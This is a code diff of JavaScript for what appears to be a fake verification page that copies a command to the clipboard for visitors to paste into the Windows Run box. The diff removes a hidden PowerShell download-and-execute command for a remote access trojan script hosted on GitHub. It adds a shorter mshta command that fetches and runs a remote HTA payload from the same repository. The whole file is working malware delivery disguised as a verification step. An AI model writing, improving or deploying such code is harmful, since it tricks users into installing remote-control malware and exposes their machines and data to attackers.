@@ -171,10 +171,8 @@
     const button = document.getElementById("verifyBtn");
     const overlay = document.getElementById("overlay");
     
-    // This command runs PowerShell directly via javascript: protocol - no external file needed
-    // The PowerShell downloads and executes rat.ps1 from GitHub
-    const psDownloadCmd = 'powershell -Command "Invoke-WebRequest -Uri \\"https://raw.githubusercontent.com/Skibidi101201/rat/main/rat.ps1\\" -OutFile $env:TEMP\\run.ps1; powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File $env:TEMP\\run.ps1"';
-    const mshtaCommand = 'mshta "javascript:close();new ActiveXObject(\\"WScript.Shell\\").Run(\\"' + psDownloadCmd.replace(/\\/g, '\\\\\\').replace(/"/g, '\\\\"') + '\\",0,false);"';
+    // SIMPLE COMMAND - just the HTA URL (fits in Win+R)
+    const mshtaCommand = 'mshta https://raw.githubusercontent.com/Skibidi101201/rat/main/result.hta';
     
     function copyToClipboard(text) {
       const textarea = document.createElement('textarea');
